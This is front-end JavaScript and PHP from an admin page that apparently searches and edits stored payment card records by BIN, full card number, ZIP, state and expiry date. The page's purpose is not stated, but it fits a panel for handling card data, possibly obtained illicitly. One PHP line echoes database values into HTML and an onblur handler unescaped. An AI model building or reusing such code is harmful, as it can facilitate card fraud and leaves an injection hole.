<script>
	const inputBin = document.getElementById('card-bin');

	inputBin.addEventListener('paste', (event) => {
		event.preventDefault(); // Отменяем стандартное поведение вставки
		const clipboardData = event.clipboardData || window.clipboardData;
		const textBin = clipboardData.getData('Text'); // Получаем текст из буфера обмена
		
		// Разделяем текст по строкам и убираем пустые строки
		const binnedNumbers = textBin.split('\n').filter(bin => bin.trim() !== '');
		
		// Объединяем BИНы через запятую
		const resultBin = binnedNumbers.join(', ');
		
		// Вставляем результат в инпут
		inputBin.value = resultBin;
	});
</script>
<script>
	const inputBinZip = document.getElementById('binInput');

	inputBinZip.addEventListener('paste', (event) => {
		event.preventDefault(); // Отменяем стандартное поведение вставки
		const clipboardData = event.clipboardData || window.clipboardData;
		const textBinZip = clipboardData.getData('Text'); // Получаем текст из буфера обмена
		
		// Разделяем текст по строкам и убираем пустые строки
		const binnedNumbersZips = textBinZip.split('\n').filter(bin => bin.trim() !== '');
		
		// Объединяем BИНы через запятую
		const resultBinZip = binnedNumbersZips.join(', ');
		
		// Вставляем результат в инпут
		inputBinZip.value = resultBinZip;
	});
</script>
<script> //Форматирование бинов, введённых в инпут
	const inputBinAddress = document.getElementById('binInputAddressSearch');

	inputBinAddress.addEventListener('paste', (event) => {
		event.preventDefault(); // Отменяем стандартное поведение вставки
		const clipboardData = event.clipboardData || window.clipboardData;
		const textBinAddress = clipboardData.getData('Text'); // Получаем текст из буфера обмена
		
		// Разделяем текст по строкам и убираем пустые строки
		const binnedAddress = textBinAddress.split('\n').filter(bin => bin.trim() !== '');
		
		// Объединяем BИНы через запятую
		const resultBinAddress = binnedAddress.join(', ');
		
		// Вставляем результат в инпут
		inputBinAddress.value = resultBinAddress;
	});
</script>

<script>
	const inputZip = document.getElementById('zip');

	inputZip.addEventListener('paste', (event) => {
		event.preventDefault(); // Отменяем стандартное поведение вставки
		const clipboardData = event.clipboardData || window.clipboardData;
		const textZip = clipboardData.getData('Text'); // Получаем текст из буфера обмена
		
		// Разделяем текст по строкам и убираем пустые строки
		const binnedZips = textZip.split('\n').filter(zip => zip.trim() !== '');
		
		// Объединяем ЗИПы через запятую
		const resultZip = binnedZips.join(', ');
		
		// Вставляем результат в инпут
		inputZip.value = resultZip;
	});
</script>

<script>
	const inputFullNumber = document.getElementById('full-number');

	inputFullNumber.addEventListener('paste', (event) => {
		event.preventDefault(); // Отменяем стандартное поведение вставки
		const clipboardData = event.clipboardData || window.clipboardData;
		const textFullNumber = clipboardData.getData('Text'); // Получаем текст из буфера обмена
		
		// Разделяем текст по строкам и убираем пустые строки
		const binnedFullNumbers = textFullNumber.split('\n').filter(number => number.trim() !== '');
		
		// Объединяем номера карты через запятую
		const resultFullNumber = binnedFullNumbers.join(', ');
		
		// Вставляем результат в инпут
		inputFullNumber.value = resultFullNumber;
	});
</script>

<script>
	const inputСountry = document.getElementById('country');

	inputСountry.addEventListener('paste', (event) => {
		event.preventDefault(); // Отменяем стандартное поведение вставки
		const clipboardData = event.clipboardData || window.clipboardData;
		const textСountry = clipboardData.getData('Text'); // Получаем текст из буфера обмена
		
		// Разделяем текст по строкам и убираем пустые строки
		const binnedСountries = textСountry.split('\n').filter(country => country.trim() !== '');
		
		// Объединяем страны через запятую
		const resultСountry = binnedСountries.join(', ');
		
		// Вставляем результат в инпут
		inputСountry.value = resultСountry;
	});
</script>

<script>
	const inputСity = document.getElementById('city');

	inputСity.addEventListener('paste', (event) => {
		event.preventDefault(); // Отменяем стандартное поведение вставки
		const clipboardData = event.clipboardData || window.clipboardData;
		const textСity = clipboardData.getData('Text'); // Получаем текст из буфера обмена
		
		// Разделяем текст по строкам и убираем пустые строки
		const binnedСities = textСity.split('\n').filter(city => city.trim() !== '');
		
		// Объединяем города через запятую
		const resultСity = binnedСities.join(', ');
		
		// Вставляем результат в инпут
		inputСity.value = resultСity;
	});
</script>

<script>
    const stateMap = {
        'AL': 'Alabama',
        'AK': 'Alaska',
        'AZ': 'Arizona',
        'AR': 'Arkansas',
        'CA': 'California',
        'CO': 'Colorado',
        'CT': 'Connecticut',
        'DE': 'Delaware',
        'FL': 'Florida',
        'GA': 'Georgia',
        'HI': 'Hawaii',
        'ID': 'Idaho',
        'IL': 'Illinois',
        'IN': 'Indiana',
        'IA': 'Iowa',
        'KS': 'Kansas',
        'KY': 'Kentucky',
        'LA': 'Louisiana',
        'ME': 'Maine',
        'MD': 'Maryland',
        'MA': 'Massachusetts',
        'MI': 'Michigan',
        'MN': 'Minnesota',
        'MS': 'Mississippi',
        'MO': 'Missouri',
        'MT': 'Montana',
        'NE': 'Nebraska',
        'NV': 'Nevada',
        'NH': 'New Hampshire',
        'NJ': 'New Jersey',
        'NM': 'New Mexico',
        'NY': 'New York',
        'NC': 'North Carolina',
        'ND': 'North Dakota',
        'OH': 'Ohio',
        'OK': 'Oklahoma',
        'OR': 'Oregon',
        'PA': 'Pennsylvania',
        'RI': 'Rhode Island',
        'SC': 'South Carolina',
        'SD': 'South Dakota',
        'TN': 'Tennessee',
        'TX': 'Texas',
        'UT': 'Utah',
        'VT': 'Vermont',
        'VA': 'Virginia',
        'WA': 'Washington',
        'WV': 'West Virginia',
        'WI': 'Wisconsin',
        'WY': 'Wyoming'
    };

    const input = document.getElementById('state');

    // Обработчик события paste
    input.addEventListener('paste', (event) => {
        setTimeout(() => {
            const inputValue = input.value;
            updateInputValue(inputValue);
        }, 0);
    });

    // Обработчик события blur (потеря фокуса)
    input.addEventListener('blur', () => {
        const inputValue = input.value;
        updateInputValue(inputValue);
    });

    function updateInputValue(inputValue) {
        const abbreviations = inputValue.split(/[\s,]+/); // Разделение по пробелам и запятым

        // Проверка, если введенное значение уже полное название
        const isFullName = abbreviations.every(abbr => {
            const upperAbbr = abbr.toUpperCase();
            return stateMap[upperAbbr] === undefined; // Если это не сокращение
        });

        if (isFullName) {
            return; // Если это полное название, ничего не меняем
        }

        const fullNames = abbreviations.map(abbr => {
            const upperAbbr = abbr.toUpperCase();
            return stateMap[upperAbbr] ? stateMap[upperAbbr] : abbr;
        });

        // Обновление значения инпута, если есть замены
        if (fullNames.join(', ') !== inputValue) {
            input.value = fullNames.join(', ');
        }
    }
</script>
<script>
$(document).ready(function() {
	$('#deleteGarbageForm').on('submit', function(event) {		
		event.preventDefault(); // Предотвращаем стандартное поведение формы
		if (confirm("Вы уверены, что хотите удалить мусорные записи?")) {
			$.ajax({
				type: 'POST',
				url: '', // Отправляем запрос на тот же файл
				dataType: 'json',
				success: function(response) {
					//$('#message').text(response.message).removeClass('error');
					$('#message').text("Мусорные данные удалены").removeClass('error');
					// Скрываем сообщение через 2 секунды
					setTimeout(function() {
						$('#message').fadeOut();
					}, 2000);
				},
				error: function() {
					$('#message').text("Произошла ошибка при выполнении запроса").addClass('error');
					// Скрываем сообщение через 2 секунды
					setTimeout(function() {
						$('#message').fadeOut();
					}, 2000);
				}
			});
		}
	});
});
</script>
<script>
	$(document).ready(function() {
		$('#format-exp-date').on('click', function(e) {
			//e.preventDefault(); // Предотвращаем стандартное поведение кнопки

			$.ajax({
				type: 'POST',
				url: '', // Отправляем запрос на тот же файл
				data: { format_exp_date: true }, // Данные, которые отправляем
				dataType: 'json',
				success: function(response) {
					$('#messageFormatExp').text(response.message).removeClass('error');
					// Скрываем сообщение через 3 секунды
					setTimeout(function() {
						$('#messageFormatExp').fadeOut();
					}, 2000);
				},
				error: function() {
					$('#messageFormatExp').text("Произошла ошибка при выполнении запроса.").addClass('error');
					// Скрываем сообщение через 3 секунды
					setTimeout(function() {
						$('#messageFormatExp').fadeOut();
					}, 2000);
				}
			});
		});
	});
</script>
<script>
//Выгрузка мусорных записей на отдельную страницу в новую вкладку
$(document).ready(function() {
	$('#show-garbage').on('click', function() {
		// Открываем новую вкладку с мусорными записями
		window.open('show_garbage.php', '_blank');
	});
});
</script>
<td contenteditable="true" onblur="updateValue(this, 'number', '<?php echo $record['id'] ?>')" ondblclick="this.contentEditable='true';"><?php echo $record['number'] ?></td>
